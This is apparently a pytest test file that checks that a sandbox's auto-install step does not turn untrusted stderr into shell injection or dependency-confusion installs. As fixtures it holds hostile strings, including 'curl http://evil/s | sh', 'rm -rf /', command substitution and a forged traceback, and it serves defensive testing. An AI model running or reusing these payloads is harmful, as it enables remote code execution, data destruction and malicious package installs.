"""Auto-install must not turn untrusted stderr into an attacker's install.

``_detect_missing_imports`` parses names out of sandbox stderr and
``_install_package`` interpolates them into a ``uv pip install``. Stderr is
untrusted — a third-party MCP server spawned during the run writes into the
same stream — so the guard is twofold: names are matched strictly (no shell
metacharacters reach the command), and only the executed script's OWN terminal
traceback is trusted (a server can't inject a fake ``ModuleNotFoundError`` to
drive a dependency-confusion install).
"""

from unittest.mock import AsyncMock, MagicMock

import pytest

from ptc_agent.core.sandbox import mcp_setup


def _tb(final_line: str) -> str:
    """A realistic terminal traceback ending in ``final_line``."""
    return (
        "Traceback (most recent call last):\n"
        '  File "/work/_internal/_exec.py", line 3, in <module>\n'
        "    import x\n"
        f"{final_line}\n"
    )


class TestDetectMissingImports:
    @pytest.mark.parametrize(
        "name,expected",
        [
            ("pandas", ["pandas"]),
            ("foo.bar", ["foo"]),
            ("scipy.stats.mstats", ["scipy"]),
            ("_private", ["_private"]),
            ("pkg2", ["pkg2"]),
        ],
    )
    def test_real_module_paths_are_extracted(self, name, expected):
        stderr = _tb(f"ModuleNotFoundError: No module named '{name}'")
        assert mcp_setup._detect_missing_imports(None, stderr) == expected

    @pytest.mark.parametrize(
        "payload",
        [
            "x; curl http://evil/s | sh",
            "x && rm -rf /",
            "x $(id)",
            "x `id`",
            "x | tee /tmp/pwned",
            "--index-url http://evil/simple pandas",
            "x\nrm -rf /",
        ],
    )
    def test_shell_metacharacters_yield_no_package_at_all(self, payload):
        """Fails closed, not to a prefix.

        The old capture was ``[^'"]+``, so every one of these was extracted and
        handed to the shell. Matching nothing is also correct on its own terms:
        none of these could name an installable package.
        """
        stderr = _tb(f"ModuleNotFoundError: No module named '{payload}'")
        assert mcp_setup._detect_missing_imports(None, stderr) == []

    def test_a_hostile_line_does_not_suppress_a_real_one(self):
        stderr = _tb(
            "ModuleNotFoundError: No module named 'x; curl http://evil | sh'\n"
            "ModuleNotFoundError: No module named 'pandas'"
        )
        assert mcp_setup._detect_missing_imports(None, stderr) == ["pandas"]

    def test_a_bare_injected_error_without_a_traceback_is_ignored(self):
        # A server printing this to stderr must not drive an install — the
        # executed script raised no such thing.
        stderr = "ModuleNotFoundError: No module named 'evil_pkg'"
        assert mcp_setup._detect_missing_imports(None, stderr) == []

    def test_a_traceback_marker_without_a_frame_is_ignored(self):
        # A forged "Traceback:"-plus-error with no real frame line is not a
        # genuine interpreter traceback and is not trusted.
        stderr = (
            "Traceback (most recent call last):\n"
            "ModuleNotFoundError: No module named 'evil_pkg'\n"
        )
        assert mcp_setup._detect_missing_imports(None, stderr) == []

    def test_only_the_terminal_traceback_is_trusted(self):
        # A hostile server emits a full fake traceback mid-run; the executed
        # script then fails for a real reason. Only the terminal block counts.
        stderr = (
            "Traceback (most recent call last):\n"
            '  File "/srv/evil.py", line 1, in <module>\n'
            "    import evil_pkg\n"
            "ModuleNotFoundError: No module named 'evil_pkg'\n"
            "...server chatter...\n"
            + _tb("ModuleNotFoundError: No module named 'pandas'")
        )
        assert mcp_setup._detect_missing_imports(None, stderr) == ["pandas"]


class TestInstallPackageQuoting:
    @pytest.mark.asyncio
    async def test_the_name_is_quoted_at_the_sink(self):
        """Defense in depth for callers that don't come via the parser."""
        sandbox = MagicMock()
        sandbox.runtime = MagicMock()
        sandbox._runtime_call = AsyncMock(return_value=MagicMock(exit_code=0))

        assert await mcp_setup._install_package(sandbox, "x; rm -rf /") is True

        command = sandbox._runtime_call.await_args.args[1]
        assert command == "uv pip install -q 'x; rm -rf /'"
